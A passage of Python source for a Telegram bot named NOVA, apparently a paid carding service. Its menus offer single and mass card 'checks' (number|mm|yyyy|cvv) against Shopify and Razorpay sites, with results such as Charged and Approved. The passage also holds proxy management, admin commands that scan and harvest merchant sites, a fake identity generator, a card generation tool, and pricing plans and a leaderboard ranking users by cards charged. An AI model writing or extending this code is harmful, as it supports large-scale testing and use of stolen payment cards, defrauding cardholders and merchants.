        f"🏦 <b>{bs('IBAN Validation')}</b>\n{SEP}\n"
        f"📌 <code>{iban}</code>\n"
        f"✅ {bs('Status')}: {'Valid' if ok else 'Invalid'}"))


# ====================== FAKE / SPLIT ======================
FAKE_DATA = {
    'US': {'name':'United States','phone_code':'+1','len':10,
        'cities':[('New York','NY','10001'),('Los Angeles','CA','90001')],
        'streets':['Main St','Oak Ave','Pine Rd'],
        'first':['John','Jane','Michael','Sarah','David'],
        'last':['Smith','Johnson','Williams','Brown','Jones']},
    'GB': {'name':'United Kingdom','phone_code':'+44','len':10,
        'cities':[('London','England','EC1A 1BB'),('Manchester','England','M1 1AE')],
        'streets':['High St','Church St'],
        'first':['Oliver','George','Harry','Jack'],
        'last':['Smith','Jones','Williams','Taylor']},
    'IN': {'name':'India','phone_code':'+91','len':10,
        'cities':[('Mumbai','MH','400001'),('Delhi','Delhi','110001')],
        'streets':['MG Road','Nehru Road'],
        'first':['Aarav','Vivaan','Aditya','Arjun'],
        'last':['Sharma','Verma','Patel','Kumar']},
    'AE': {'name':'UAE','phone_code':'+971','len':9,
        'cities':[('Dubai','DU','00000')],
        'streets':['Sheikh Zayed Road'],
        'first':['Mohammed','Ahmed','Ali'],
        'last':['Al Maktoum','Al Nahyan']},
    'CA': {'name':'Canada','phone_code':'+1','len':10,
        'cities':[('Toronto','ON','M5V 2H1')],
        'streets':['Main St','Queen St'],
        'first':['Liam','Noah','Oliver'],
        'last':['Smith','Johnson','Williams']},
    'AU': {'name':'Australia','phone_code':'+61','len':9,
        'cities':[('Sydney','NSW','2000')],
        'streets':['George St','Collins St'],
        'first':['Oliver','Jack','William'],
        'last':['Smith','Jones','Williams']},
    'DE': {'name':'Germany','phone_code':'+49','len':11,
        'cities':[('Berlin','BE','10115')],
        'streets':['Hauptstraße','Bahnhofstraße'],
        'first':['Lukas','Maximilian','Felix'],
        'last':['Müller','Schmidt','Schneider']},
    'FR': {'name':'France','phone_code':'+33','len':9,
        'cities':[('Paris','IDF','75001')],
        'streets':['Rue de la Paix'],
        'first':['Gabriel','Louis','Raphaël'],
        'last':['Martin','Bernard','Dubois']},
    'ES': {'name':'Spain','phone_code':'+34','len':9,
        'cities':[('Madrid','Madrid','28001')],
        'streets':['Calle Mayor'],
        'first':['Hugo','Martín','Pablo'],
        'last':['García','Rodríguez','González']},
    'IT': {'name':'Italy','phone_code':'+39','len':10,
        'cities':[('Roma','Lazio','00100')],
        'streets':['Via Roma'],
        'first':['Leonardo','Francesco','Alessandro'],
        'last':['Rossi','Russo','Ferrari']},
    'NL': {'name':'Netherlands','phone_code':'+31','len':9,
        'cities':[('Amsterdam','NH','1011')],
        'streets':['Kerkstraat'],
        'first':['Daan','Sem','Lucas'],
        'last':['De Jong','Jansen','De Vries']},
    'CH': {'name':'Switzerland','phone_code':'+41','len':9,
        'cities':[('Zürich','ZH','8001')],
        'streets':['Bahnhofstrasse'],
        'first':['Noah','Liam','Luca'],
        'last':['Müller','Meier','Schmid']},
    'SG': {'name':'Singapore','phone_code':'+65','len':8,
        'cities':[('Singapore','SG','018956')],
        'streets':['Orchard Road'],
        'first':['Wei','Ming','Hao'],
        'last':['Tan','Lim','Lee']},
    'JP': {'name':'Japan','phone_code':'+81','len':10,
        'cities':[('Tokyo','13','100-0001')],
        'streets':['Chuo-dori'],
        'first':['Takashi','Yuki','Hiroshi'],
        'last':['Yamamoto','Tanaka','Suzuki']},
}


def _fake_resolve(code):
    code = (code or '').strip().upper()
    return code if code in FAKE_DATA else None


def _fake_phone(code):
    d = FAKE_DATA[code]
    n = d['len']
    if code in ('US', 'CA'):
        area = str(random.randint(2, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(2))
        mid = str(random.randint(2, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(2))
        last = ''.join(str(random.randint(0, 9)) for _ in range(4))
        return f"({area}) {mid}-{last}"
    digits = ''.join(str(random.randint(0, 9)) for _ in range(n))
    return f"{d['phone_code']} {digits}"


@client.on(events.NewMessage(pattern=r'^[/.]fake(?:\s+(.+))?$'))
async def cmd_fake(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    arg = (event.pattern_match.group(1) or '').strip()
    if not arg or arg.lower() == 'list':
        codes = sorted(FAKE_DATA.keys())
        return await styled_reply(event, pe(
            f"🌍 <b>{bs('Fake Identity Generator')}</b>\n{SEP}\n"
            f"✨ {bs('Countries')} (<code>{len(codes)}</code>):\n"
            f"<code>{' '.join(codes)}</code>\n\n"
            f"💡 <code>• /fake US</code> · <code>• /fake random</code>"))
    if arg.lower() == 'random':
        code = random.choice(list(FAKE_DATA.keys()))
    else:
        code = _fake_resolve(arg)
        if not code:
            return await styled_reply(event, pe(
                f"❌ <b>{bs('Unknown country')}</b>: <code>{arg}</code>"))
    d = FAKE_DATA[code]
    first = random.choice(d['first'])
    last = random.choice(d['last'])
    city, state, zip_c = random.choice(d['cities'])
    street = f"{random.choice(d['streets'])} {random.randint(1, 9999)}"
    phone = _fake_phone(code)
    await styled_reply(event, pe(
        f"👤 <b>{bs('Full Name')}</b> ⌁ <code>{first} {last}</code>\n"
        f"🏠 <b>{bs('Street')}</b> ⌁ <code>{street}</code>\n"
        f"🏙️ <b>{bs('City')}</b> ⌁ <code>{city}</code>\n"
        f"📍 <b>{bs('State')}</b> ⌁ <code>{state}</code>\n"
        f"🌍 <b>{bs('Country')}</b> ⌁ <code>{d['name']}</code>\n"
        f"📮 <b>{bs('Zip')}</b> ⌁ <code>{zip_c}</code>\n"
        f"📞 <b>{bs('Phone')}</b> ⌁ <code>{phone}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]split(?:\s+(\d+))?$'))
async def cmd_split(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    m = event.pattern_match.group(1)
    chunk_size = 1000
    if m:
        try: chunk_size = int(m)
        except ValueError: chunk_size = 1000
    if chunk_size < 50: chunk_size = 50
    if chunk_size > 100000: chunk_size = 100000
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Split')}</b>\n{SEP}\n"
            f"💡 {bs('Reply to a .txt file with')}\n"
            f"<code>• /split 1000</code>"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Splitting')} <code>{chunk_size}</code>..."))
    path = None
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [ln.rstrip('\n') for ln in (await f.read()).splitlines() if ln.strip()]
    except Exception as e:
        if path and os.path.exists(path):
            try: os.remove(path)
            except Exception: pass
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))
    if path and os.path.exists(path):
        try: os.remove(path)
        except Exception: pass
    if not lines:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('File empty')}</b>"))
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    total = len(chunks)
    for i, ch in enumerate(chunks, 1):
        fname = f"NOVA_split_{i}_{datetime.now().strftime('%H%M%S')}.txt"
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for ln in ch: await f.write(ln + "\n")
        try:
            await send_file_entities(uid, fname,
                pe(f"📁 {bs('Part')} {i}/{total} · <code>{len(ch)}</code>"))
        except Exception:
            pass
        try: os.remove(fname)
        except Exception: pass
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('Split complete')}</b>\n{SEP}\n"
        f"📁 {bs('Total lines')}: <code>{len(lines)}</code>\n"
        f"🧩 {bs('Chunks')}: <code>{total}</code>"))


# ====================== /fb ======================
@client.on(events.NewMessage(pattern=r'^[/.]fb$'))
async def cmd_fb(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Premium Only')}</b>\n{SEP}\n"
            f"💎 {bs('Only premium users can use')} <code>• /fb</code>\n"
            f"💎 {bs('Redeem a key with')} <code>• /redeem KEY</code>"))
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a media message with')} <code>• /fb</code>"))
    reply = await event.get_reply_message()
    if not (reply.media or reply.photo or reply.document or reply.video):
        return await styled_reply(event, pe(f"💎 {bs('That message has no media to forward.')}"))
    try:
        await client_instance.forward_messages(GROUP_CHAT_ID, reply)
        await styled_reply(event, pe(f"✅ {bs('Forwarded to group.')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ====================== VIDEO CMDS ======================
@client.on(events.NewMessage(pattern=r'^[/.]setwelcomevideo$'))
async def cmd_setwelcomevideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a video')}"))
    reply = await event.get_reply_message()
    if not (reply.video or reply.document):
        return await styled_reply(event, pe(f"💎 {bs('Not a video')}"))
    path = os.path.join(VIDEO_DIR, "welcome.mp4")
    try:
        await client_instance.download_media(reply, path)
        try: os.remove(WELCOME_FILE_ID_FILE)
        except Exception: pass
        await styled_reply(event, pe(f"✅ {bs('Welcome video set')} (cache cleared)"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addhitvideo$'))
async def cmd_addhitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a video')}"))
    reply = await event.get_reply_message()
    if not (reply.video or reply.document):
        return await styled_reply(event, pe(f"💎 {bs('Not a video')}"))
    fname = f"hit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
    path = os.path.join(VIDEO_DIR, fname)
    try:
        await client_instance.download_media(reply, path)
        await styled_reply(event, pe(f"✅ {bs('Added')} <code>{fname}</code>"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]listhitvideos$'))
async def cmd_listhitvideos(event):
    if event.sender_id not in ADMIN_ID:
        return
    vids = get_hit_videos()
    if not vids:
        return await styled_reply(event, pe(f"💎 {bs('No hit videos')}"))
    lines = [f"{i}. <code>{os.path.basename(v)}</code>" for i, v in enumerate(vids, 1)]
    await styled_reply(event, pe(
        f"🎬 <b>{bs('Hit videos')}</b> ({len(vids)})\n{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]removehitvideo\s+'))
async def cmd_removehitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /removehitvideo 1</code>"))
    try:
        idx = int(parts[1]) - 1
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid')}</b>"))
    vids = get_hit_videos()
    if idx < 0 or idx >= len(vids):
        return await styled_reply(event, pe(f"💎 <b>{bs('Out of range')}</b>"))
    try:
        os.remove(vids[idx])
        await styled_reply(event, pe(
            f"✅ {bs('Removed')} <code>{os.path.basename(vids[idx])}</code>"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]hitvideo$'))
async def cmd_hitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    vids = get_hit_videos()
    if not vids:
        return await styled_reply(event, pe(f"💎 {bs('No hit videos')}"))
    try:
        await send_file_entities(event.chat_id, random.choice(vids),
            pe(f"🎬 {bs('Sample')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ====================== TREE / INIT ======================
@client.on(events.NewMessage(pattern=r'^[/.]start(?:\s+(.+))?$'))
async def cmd_start(event):
    payload = (event.pattern_match.group(1) or '').strip()
    if payload.startswith('ref_'):
        ref_code = payload[4:].strip()
        try:
            if attach_referral(event.sender_id, ref_code):
                await styled_reply(event, pe(
                    f"🎁 <b>{bs('Referral Applied!')}</b>\n{SEP}\n"
                    f"✅ {bs('Joined via friend invite')}\n"
                    f"💎 {bs('Complete')} <code>{REFERRAL_MIN_CHECKS}</code> "
                    f"{bs('check to unlock bonus')}"))
        except Exception as e:
            log_system("REFERRAL", f"attach failed: {e}", "error")

    maint, joined = await asyncio.gather(
        check_maintenance(event),
        force_join_check(event),
        return_exceptions=True,
    )
    if maint is True or joined is False:
        return

    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or "User"
    except Exception:
        username = "User"

    if uid in ADMIN_ID:
        status_text = f"👑 {bs('Admin')}"
    elif is_premium(uid):
        status_text = f"💎 {bs('Premium')}"
    else:
        status_text = f"🆓 {bs('Free')}"

    limit_text = bs("Unlimited") if (is_premium(uid) or uid in ADMIN_ID) else "N/A cards/file"

    text = pe(f"""{SEP}
    ✨ {bs('Welcome to NOVA')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{uid}</code>
📊 {bs('Status')}: {status_text}
🎯 {bs('Limit')}: {limit_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
📌 {bs('Use the buttons below to get started.')}
{SEP}""")

    buttons = main_menu_buttons(uid)
    cached_fid = get_welcome_file_id()
    text_clean, wents = build_entities(text)

    if cached_fid:
        try:
            await client_instance.send_file(
                event.chat_id, cached_fid,
                caption=text_clean, formatting_entities=wents,
                buttons=buttons, supports_streaming=True)
            return
        except Exception as e:
            log_system("START", f"cached file_id failed: {e}", "warning")

    welcome = get_welcome_video()
    if welcome:
        try:
            sent = await client_instance.send_file(
                event.chat_id, welcome,
                caption=text_clean, formatting_entities=wents,
                buttons=buttons, supports_streaming=True)
            if sent and sent.video:
                set_welcome_file_id(sent.video.id)
                log_system("START", f"cached welcome file_id: {sent.video.id}")
            return
        except Exception as e:
            log_system("START", f"welcome video send failed: {e}", "error")

    await styled_reply(event, text, buttons=buttons)


# ====================== MENUS ======================
def main_menu_buttons(uid=None):
    buttons = [
        [pbtn(bs("🔓 Gates"), data="gates_menu", style="success", icon="🔓"),
         pbtn(bs("🔌 Proxy"), data="proxy_menu", style="primary", icon="🔌")],
        [pbtn(bs("🛠️ Tools"), data="tools_menu", style="primary", icon="🛠️"),
         pbtn(bs("💎 Plans"), data="plans_pricing", style="success", icon="💎")],
        [pbtn(bs("🎁 Referrals"), data="ref_menu", style="success", icon="🎁"),
         pbtn(bs("🏆 Rank"), data="rank_menu", style="primary", icon="🏆")],
        [pbtn(bs("📩 Support"),
              url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
              style="primary", icon="📩"),
         pbtn(bs("❌ Close"), data="close_menu", style="danger", icon="❌")],
    ]
    if uid and uid in ADMIN_ID:
        buttons.append([pbtn(bs("👑 Admin Panel"), data="admin_panel",
                             style="success", icon="👑")])
    return buttons


@client.on(events.CallbackQuery(data=b"main_menu"))
async def cb_main(event):
    await event.answer()
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
    except Exception:
        username = f"user_{uid}"
    if uid in ADMIN_ID:
        status = "👑 Admin"
    elif is_premium(uid):
        status = "⭐ Premium"
    else:
        status = "🆓 Free"
    text = pe(f"""💎 <b>{bs('NOVA')}</b>
{SEP}
👤 @{username}
🆔 <code>{uid}</code>
📊 {status}
{SEP}
🔥 {bs('Fast · Accurate · Reliable')}
💡 {bs('Use the buttons below')}
{SEP}
{DEV_LINE}""")
    try:
        await event.edit(text, buttons=main_menu_buttons(uid),
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"close_menu"))
async def cb_close(event):
    await event.answer()
    try:
        await event.delete()
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"check_joined"))
async def cb_check_joined(event):
    uid = event.sender_id
    _JOIN_CACHE.pop(uid, None)
    if await is_user_joined(uid):
        await event.answer("✅ Verified!", alert=True)
        try:
            await event.delete()
        except Exception:
            pass
        try:
            sender = await event.get_sender()
            username = sender.username or "User"
        except Exception:
            username = "User"
        status_text = f"👑 {bs('Admin')}" if uid in ADMIN_ID else (
            f"💎 {bs('Premium')}" if is_premium(uid) else f"🆓 {bs('Free')}")
        welcome = pe(f"""{SEP}
    ✨ {bs('Welcome to NOVA')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{uid}</code>
📊 {bs('Status')}: {status_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
{SEP}""")
        try:
            await client_instance.send_message(
                event.chat_id, *build_entities(welcome),
                buttons=main_menu_buttons(uid), link_preview=False)
        except Exception:
            pass
    else:
        await event.answer("❌ Not joined yet", alert=True)


@client.on(events.CallbackQuery(data=b"gates_menu"))
async def cb_gates(event):
    await event.answer()
    text = pe(f"""🔓 <b>{bs('Gates')}</b>
{SEP}
🛒 <b>{bs('Shopify')}</b>
└─ <code>• /sh</code> · <code>• /msh</code>
{SEP}
💳 <b>{bs('Razorpay')}</b>
└─ <code>• /rz</code> · <code>• /mrz</code>
{SEP}
🔑 <b>{bs('Key')}</b>
└─ <code>• /redeem</code>
{SEP}
📊 <b>{bs('Info')}</b>
└─ <code>• /me</code> · <code>• /rank</code> · <code>• /streak</code>""")
    kb = [
        [pbtn("• /sh", data="sub_sh_help", style="success", icon="🛒"),
         pbtn("• /msh", data="sub_mass", style="primary", icon="📦")],
        [pbtn("• /rz", data="sub_rz_help", style="success", icon="💳"),
         pbtn("• /mrz", data="sub_mrz_help", style="primary", icon="📦")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")],
    ]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_sh_help"))
async def cb_sub_sh_help(event):
    await event.answer()
    text = pe(f"""🛒 <b>{bs('/sh — Single Card Check')}</b>
{SEP}
<b>{bs('Syntax')}</b>
└─ <code>• /sh number|mm|yyyy|cvv</code>
{SEP}
<b>{bs('Returns')}</b>
┣ 🥇 {bs('Charged')}
┣ 🥈 {bs('Approved')}
┣ 🥉 {bs('3DS')}
┣ 🥔 {bs('Declined')}
┗ 🧨 {bs('Error')}""")
    kb = [[pbtn(bs("🔙 Back"), data="gates_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_rz_help"))
async def cb_sub_rz_help(event):
    await event.answer()
    text = pe(f"""💳 <b>{bs('/rz — Single Razorpay Check')}</b>
{SEP}
<b>{bs('Syntax')}</b>
└─ <code>• /rz number|mm|yyyy|cvv</code>
{SEP}
<b>{bs('Requires')}</b>
┣ 🌐 Razorpay sites (/addrzsites)
┗ 🔌 Proxies (/addproxy)""")
    kb = [[pbtn(bs("🔙 Back"), data="gates_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_mass"))
async def cb_sub_mass(event):
    await event.answer()
    text = pe(f"""📦 <b>{bs('/msh — Mass Shopify Check')}</b>
{SEP}
<b>{bs('Syntax')}</b>
└─ <code>• /msh</code> <i>(reply to .txt)</i>
{SEP}
<b>{bs('Output')}</b>
└─ 5 .txt files""")
    kb = [[pbtn(bs("🔙 Back"), data="gates_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_mrz_help"))
async def cb_sub_mrz_help(event):
    await event.answer()
    text = pe(f"""📦 <b>{bs('/mrz — Mass Razorpay Check')}</b>
{SEP}
<b>{bs('Syntax')}</b>
└─ <code>• /mrz</code> <i>(reply to .txt)</i>""")
    kb = [[pbtn(bs("🔙 Back"), data="gates_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"proxy_menu"))
async def cb_proxy_menu(event):
    await event.answer()
    uid = event.sender_id
    is_prem = (uid in ADMIN_ID or is_premium(uid))
    count = len(load_user_proxies(uid))
    if not is_prem:
        text = pe(f"""🔌 <b>{bs('Proxy Manager')}</b>
{SEP}
💎 <b>{bs('Premium only')}</b>""")
        kb = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
        except Exception:
            pass
        return
    text = pe(f"""🔌 <b>{bs('Proxy Manager')}</b>
{SEP}
📁 {bs('Saved')}: <code>{count}/{MAX_PROXIES_PER_USER}</code>
{SEP}
📥 <code>• /addproxy</code>
🔀 <code>• /proxy</code>  (test all)
📂 <code>• /myproxy</code>
📤 <code>• /getproxy</code>
{SEP}
❌ <code>• /rmproxy ip:port:u:p</code>
🔢 <code>• /rmproxyindex 1,2,3</code>
🗑 <code>• /clearproxy</code>""")
    kb = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"cmd_sites"))
async def cb_cmd_sites(event):
    await event.answer()
    text = pe(f"""🌐 <b>{bs('Site Manager')}</b> (Admin)
{SEP}
🛒 <b>{bs('Shopify')}</b> — <code>{len(load_sites())}</code>
┣ <code>• /addsites</code> · <code>• /resetsites</code>
┣ <code>• /site</code> · <code>• /rm</code>
┣ <code>• /shscan</code> · <code>• /shharvest</code> · <code>• /shstat</code>
┗ <code>• /getsites</code>
{SEP}
💳 <b>{bs('Razorpay')}</b> — <code>{len(load_rz_sites())}</code>
┣ <code>• /addrzsites</code> · <code>• /resetrzsites</code>
┣ <code>• /rzscan</code> · <code>• /rzharvest</code> · <code>• /rzstat</code>
┗ <code>• /getrzsites</code>
{SEP}
⚙️ <code>• /setthreshold</code> · <code>• /setminprice</code>""")
    kb = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"tools_menu"))
async def cb_tools(event):
    await event.answer()
    text = pe(f"""🛠️ <b>{bs('Tools')}</b>
{SEP}
🔍 <code>• /bin</code> · <code>• /scg</code> · <code>• /ip</code>
🔑 <code>• /gen</code> · <code>• /iban</code> · <code>• /fake</code>
📁 <code>• /split</code>
📊 <code>• /me</code> · <code>• /rank</code> · <code>• /streak</code>
🎁 <code>• /ref</code> · <code>• /topref</code>""")
    kb = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"rank_menu"))
async def cb_rank_menu(event):
    await event.answer()
    rank = load_rank()
    if not rank:
        text = pe(f"""🏆 <b>{bs('Top 10 Charged')}</b>
{SEP}
<i>{bs('No charges yet')}</i>""")
    else:
        top = sorted(rank.items(), key=lambda x: int(x[1]), reverse=True)[:10]
        medals = ["🥇", "🥈", "🥉"]
        lines = []
        for i, (uid_s, cnt) in enumerate(top):
            try:
                ent = await client_instance.get_entity(int(uid_s))
                name = ent.first_name or uid_s
            except Exception:
                name = uid_s
            medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
            lines.append(f"{medal} <b>{name}</b> — <code>{cnt}</code>")
        text = pe(f"🏆 <b>{bs('Top 10 Charged')}</b>\n{SEP}\n" + "\n".join(lines))
    kb = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"streak_menu"))
async def cb_streak_menu(event):
    await event.answer()
    uid = event.sender_id
    s = get_streak(uid)
    cur, best = s["current"], s["best"]
    upcoming = [d for d in sorted(STREAK_MILESTONES.keys()) if d > cur]
    if upcoming:
        target = upcoming[0]
        prev = max([d for d in STREAK_MILESTONES if d <= cur] + [0])
        span = target - prev
        step = cur - prev
        bar = "▰" * max(0, step) + "▱" * max(0, span - step)
        next_str = f"{bs('Next')} <code>{target}d</code> · <code>{span-step}</code> {bs('left')}"
    else:
        bar = "▰" * 10
        next_str = f"<i>{bs('Max reached')}</i>"
    text = pe(f"""🔥 <b>{bs('Daily Streak')}</b>
{SEP}
📅 {bs('Current')}: <code>{cur}</code>
🏆 {bs('Best')}: <code>{best}</code>
✅ {bs('Total')}: <code>{s['total_checks']}</code>

{bar}
{next_str}""")
    kb = [[pbtn(bs("🔙 Tools"), data="tools_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"me_menu"))
async def cb_me_menu(event):
    await event.answer()
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"
    rank = load_rank()
    charged_total = int(rank.get(str(uid), 0))
    s = get_streak(uid)
    if uid in ADMIN_ID:
        tier = f"👑 {bs('Admin')}"; cc_limit = 100000
    elif is_premium(uid):
        tier = f"💎 {bs('Premium')}"
        info = load_premium_users().get(str(uid))
        cc_limit = int(info.get("cc_limit", DEFAULT_KEY_CC_LIMIT)) if isinstance(info, dict) else 100000
    else:
        tier = f"🆓 {bs('Free')}"; cc_limit = 0
    text = pe(f"""📊 <b>{bs('My Stats')}</b>
{SEP}
👤 <b>{name}</b> (@{username})
🆔 <code>{uid}</code>
🎖️ {bs('Tier')}: {tier}
💳 {bs('CC Limit')}: <code>{cc_limit}</code>
{SEP}
🔥 {bs('Streak')}: <code>{s['current']}</code>
💳 {bs('Charged')}: <code>{charged_total}</code>""")
    kb = [[pbtn(bs("🔙 Tools"), data="tools_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"ref_menu"))
async def cb_ref_menu(event):
    await event.answer()
    uid = event.sender_id
    s = referral_stats(uid)
    code = s["code"]
    try:
        me = await client_instance.get_me()
        bot_user = me.username or "YourBot"
    except Exception:
        bot_user = "YourBot"
    link = f"https://t.me/{bot_user}?start=ref_{code}"
    every = REFERRAL_MILESTONE_EVERY
    confirmed = s["confirmed"]
    in_cycle = confirmed % every
    bar = "▰" * in_cycle + "▱" * (every - in_cycle)
    text = pe(f"""🎁 <b>{bs('Referral Program')}</b>
{SEP}
🔗 <code>{link}</code>
🔑 <code>{code}</code>
{SEP}
📊 {bs('Confirmed')}: <code>{confirmed}</code> · ⏳ {bs('Pending')}: <code>{s['pending']}</code>

📈 <code>{bar}</code> {in_cycle}/{every}
🎯 {bs('Next in')}: <code>{s['next_milestone_in']}</code> {bs('more')}

💎 <b>{bs('Reward')}</b>: <code>+{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC</code> {bs('every')} <code>{every}</code> {bs('refs')}""")
    share_url = f"https://t.me/share/url?url={link}&text=Join%20NOVA!"
    kb = [
        [pbtn(bs("📤 Share"), url=share_url, style="success", icon="📤")],
        [pbtn(bs("🏆 Leaderboard"), data="ref_leaderboard", style="primary", icon="🏆")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")],
    ]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"ref_leaderboard"))
async def cb_ref_leaderboard(event):
    await event.answer()
    data = load_referrals()
    rows = []
    for uid_s, u in data["users"].items():
        cnt = len(u.get("rewarded", []))
        if cnt > 0:
            rows.append((uid_s, cnt, int(u.get("total_hours_earned", 0))))
    rows.sort(key=lambda x: x[1], reverse=True)
    rows = rows[:10]
    if not rows:
        text = pe(f"🏆 <b>{bs('Leaderboard')}</b>\n{SEP}\n<i>{bs('Empty')}</i>")
    else:
        medals = ["🥇", "🥈", "🥉"]
        lines = []
        for i, (uid_s, cnt, hrs) in enumerate(rows):
            try:
                ent = await client_instance.get_entity(int(uid_s))
                name = ent.first_name or uid_s
            except Exception:
                name = uid_s
            medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
            lines.append(f"{medal} <b>{name}</b> — <code>{cnt}</code> · <code>{hrs}h</code>")
        text = pe(f"🏆 <b>{bs('Leaderboard')}</b>\n{SEP}\n" + "\n".join(lines))
    kb = [[pbtn(bs("🔙 Back"), data="ref_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"plans_pricing"))
async def cb_plans(event):
    await event.answer()
    text = pe(f"""💎 <b>{bs('Plans & Pricing')}</b>

{SEP}
💎 <b>{bs('Access')}</b> — 7 {bs('Days')} — <code>$10</code>
💎 <b>{bs('Elite')}</b> — 15 {bs('Days')} — <code>$15</code>
💎 <b>{bs('Pro')}</b> — 30 {bs('Days')} — <code>$30</code>
{SEP}
🎁 {bs('Or refer')} <code>5</code> {bs('friends → 1 day free')}
{SEP}
